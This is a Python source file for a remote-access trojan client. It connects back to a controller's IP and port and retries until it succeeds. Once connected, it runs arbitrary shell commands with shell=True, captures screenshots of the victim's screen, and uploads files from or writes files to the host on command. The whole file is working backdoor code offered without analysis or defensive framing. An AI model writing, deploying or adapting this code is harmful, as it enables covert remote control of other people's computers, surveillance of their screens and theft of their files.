import socket
import time
import subprocess
import os
import json
import io
import pyautogui

class Client_connection():
        def __init__(self, ip="127.0.0.1", port=9999, hostname=socket.gethostname()):
                self.ip = ip
                self.port = port
                self.hostname = hostname
                self.s = None

        def start_connection(self):
                while True:
                        try:
                                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                self.s.connect((self.ip, self.port))
                                pre_msg = f"Connection Done {self.hostname}".encode()
                                self.s.send(pre_msg)

                                self.data_recv()
                        
                        except socket.error:
                                time.sleep(5)
                                continue

        def data_recv(self):
                while True:
                        try:
                                data = self.s.recv(1024)
                                if not data:
                                        self.s.close()
                                        break

                                try:
                                        msg = json.loads(data.decode())
                                        if msg["type"] == "screenshot":
                                                self.send_screenshot()
                                        elif msg["type"] == "upload":
                                                self.receive_file(msg["name"], msg["size"])
                                        elif msg["type"] == "download":
                                                self.send_file(msg["name"])
                                        else:
                                                continue
                                except json.JSONDecodeError:
                                        command = data.decode().strip()
                                        if command == "screenshot":
                                                self.send_screenshot()
                                        else:
                                                self.run_command(command)

                        except socket.error as e:
                                self.s.close()
                                break

        def run_command(self, command):
                try:
                        if command.startswith("cd "):
                                os.chdir(command[3:].strip())
                                result = f"[\u2713] Changed directory to {os.getcwd()}"
                        else:
                                result = subprocess.check_output(
                                        command, shell=True, stderr=subprocess.STDOUT
                                ).decode().strip()

                        if not result:
                                result = "[\u2713] Command executed, no output."

                except subprocess.CalledProcessError as e:
                        result = f"[!] Error: {e.output.decode()}"
                except Exception as e:
                        result = f"[!!] Unexpected Error: {str(e)}"

                response = {
                        "type": "cmd_result",
                        "command": command,
                        "output": result,
                        "cwd": os.getcwd(),
                        "hostname": self.hostname
                }

                self.s.send(json.dumps(response).encode())

        def send_screenshot(self):
                try:
                        buffer = io.BytesIO()
                        pyautogui.screenshot().save(buffer, format="PNG")
                        img_data = buffer.getvalue()

                        meta = json.dumps({"type": "screenshot", "size": len(img_data)}).encode()
                        self.s.send(meta)
                        ack = self.s.recv(16)
                        if ack.decode().strip() == "OK":
                                self.s.sendall(img_data)
                        else:
                                error_msg = json.dumps({"type": "screenshot_error", "error": "ACK not received"}).encode()
                                self.s.send(error_msg)

                except Exception as e:
                        error_msg = json.dumps({"type": "screenshot_error", "error": str(e)}).encode()
                        self.s.send(error_msg)

        def receive_file(self, filename, size):
                try:
                        self.s.send(b"OK")
                        file_data = b""
                        while len(file_data) < size:
                                chunk = self.s.recv(4096)
                                if not chunk:
                                        break
                                file_data += chunk

                        with open(filename, "wb") as f:
                                f.write(file_data)

                except Exception as e:
                        error_msg = json.dumps({"type": "file_error", "error": str(e)}).encode()
                        self.s.send(error_msg)
                        return

        def send_file(self, filepath):
                try:
                        with open(filepath, "rb") as f:
                                file_data = f.read()

                        meta = json.dumps({"type": "file", "name": os.path.basename(filepath), "size": len(file_data)}).encode()
                        self.s.send(meta)

                        ack = self.s.recv(16)
                        if ack.decode().strip() == "OK":
                                self.s.sendall(file_data)
                        else:
                                error_msg = json.dumps({"type": "file_error", "error": "ACK not received"}).encode()
                                self.s.send(error_msg)
                except Exception as e:
                        error_msg = json.dumps({"type": "file_error", "error": str(e)}).encode()
                        self.s.send(error_msg)

if __name__ == "__main__":
        client = Client_connection()
        client.start_connection()